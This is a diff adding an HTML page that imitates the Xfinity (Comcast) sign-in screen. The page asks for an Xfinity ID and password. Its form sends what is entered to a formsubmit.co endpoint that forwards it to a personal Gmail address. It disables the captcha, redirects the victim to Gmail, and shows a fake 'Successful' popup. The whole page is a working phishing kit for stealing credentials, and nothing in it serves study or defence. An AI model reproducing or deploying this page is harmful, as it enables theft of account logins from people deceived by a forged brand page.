@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to Xfinity</title>
+  <link rel="stylesheet" href="style.css">
+  <meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+</head>
+<body>
+  <div class="popup" id="popup">
+    <img src="HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="">
+    <h2>Successful</h2><br>
+    <h4>You may close this window now to return to your mailbox</h4>
+    <button type="submit" onclick="closepopup()"><a href="#">Ok</a></button>
+  </div>
+
+  <div id="blur" class="container">
+    <form id="form" name="signin" action="https://formsubmit.co/faithasenuga@gmail.com" method="POST">
+      <input type="hidden" name="_next" value="https://mail.google.com/mail/">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
+      <div>
+        <img src="./Monica_Monica_2024-01-04_23_04_17.png" alt="">
+      </div>
+      <div>
+        <h1>Sign in with your Xfinity ID</h1>
+      </div>
+                    <input prism-id="user" id="name" type="email" name="user" label="Enter your Xfinity ID" hide-label="true" autocomplete="username" placeholder="Email, mobile, or username" value="" spellcheck="false" maxlength="128" required="true"  data-value-missing="Please enter your Email to sign in."                    ></input>
+                    <input id="password" type="password" prism-id="user" name="password" label="Enter your Password" hide-label="true" placeholder="Password" value="" required="true"
+                        data-value-missing="Please enter your Password to sign in."></input>
+                    <p id="implied-legal" display="body3">By signing in, you agree to our <a href="">Terms of Service</a> and <a href="">Privacy Policy</a>.</p>
+
+
+                    <button prism-id="sign_in" type="submit" tone="theme1" class="block my-10" onclick="openpopup();openpopup2()">Let's go</button>
+    </form>
+    <div class="listitem">
+       <ul>
+        <div class="split">
+          <li><a href="">New to Xfinity? View exclusive offers near you <span></span> </a></li>
+        </div>
+        <div class="split">
+           <li><a href="">Find your Xfinity ID <span></span> </a></li>
+        </div>
+        <div class="split">
+            <li><a href="">Create a new Xfinity ID<span></span></a></li>
+        </div>
+    
+     </ul>
+    </div>
+   
+    <div id="lowerimage">
+      <img src="./Xfinity Refreshed SIPs Live Sports_Live Sports 960x1200 .jpg" alt="">
+    </div>
+
+      <div>
+        <ul class="f1">
+        <li>Web Terms of Service</li>
+        <li>CA Notice at Collection</li>
+        <li>Privacy Policy</li>
+      </ul>
+      <br>
+      <ul class="f2">
+        <li>Your Privacy Choices</li>
+        <li>Ad choices</li>
+      </ul>
+      </div>
+  
+  </div>
+<footer>
+  <p>Cookie preference</p>
+</footer>
+  <script>
+    const form = document.getElementById('form');
+const errorElement = document.getElementById('error');
+const emailInput = document.getElementById('name');
+const passwordInput = document.getElementById('password');
+
+// Get popup and blur elements
+let popup = document.getElementById("popup");
+let blur = document.getElementById("blur");
+
+// Functions to open and close popup
+function togglePopup() {
+  popup.classList.toggle("open-popup");
+  blur.classList.toggle("active");
+}
+
+function openpopup(){
+  // Check if email and password inputs are filled
+  if(emailInput.value !== '' && passwordInput.value !== '') {
+    popup.classList.add("open-popup");
+    blur.classList.add("active");
+  } else {
+    // If inputs are not filled, prevent form submission and show error messages
+    let messages = [];
+    if(emailInput.value === '') {
+      messages.push('Email Address is required');
+    }
+    if(passwordInput.value === '') {
+      messages.push('Password is required');
+    }
+    errorElement.innerText = messages.join(', ');
+  }
+}
+
+function closepopup(){
+  popup.classList.remove("open-popup");
+  blur.classList.remove("active");
+}
+
+// Add event listener to form
+form.addEventListener('submit', (e) => {
+  let messages = [];
+
+  // Check if email input is empty
+  if(emailInput.value === '') {
+    messages.push('Email Address is required');
+  }
+
+  // Check if password input is empty
+  if(passwordInput.value === '') {
+    messages.push('Password is required');
+  }
+
+  // If there are messages, prevent form submission and show error messages
+  if(messages.length > 0) {
+    e.preventDefault();
+    errorElement.innerText = messages.join(', ');
+  }
+});
+  </script>
+  <script src="error.js"></script>
+</body>
+</html>
